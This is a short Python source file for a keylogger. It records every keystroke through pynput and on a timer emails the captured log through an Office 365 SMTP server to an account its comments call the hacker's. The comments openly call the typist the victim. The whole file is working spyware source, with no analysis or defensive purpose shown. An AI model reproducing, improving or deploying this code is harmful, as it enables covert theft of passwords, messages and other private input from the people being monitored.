#!/usr/bin/env python
# importing packages for keyboard inputs threading and SMTP libraries
import pynput.keyboard
import threading
import smtplib


class Keylogger:
  # creation of a constructor 
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password
    # to append each and every keystrokes to log 
    def append_to_log(self, string):
        self.log = self.log + string
# gives which key has being typed by the victim
    def process_key_press(self, key):

        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key= " " + str(key) + " "
        self.append_to_log(str(current_key))
# report what ever the key strokes does the victim types it should make a report in the form of a mail
    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
# for the report each report has to be sent to the hacker's email address of what and all the keystrokes did the victim has typed 
  # note gmail cannot be used due to security rights we have used outlook account for this to send the reports of the victims
    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.office365.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
# threading 
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
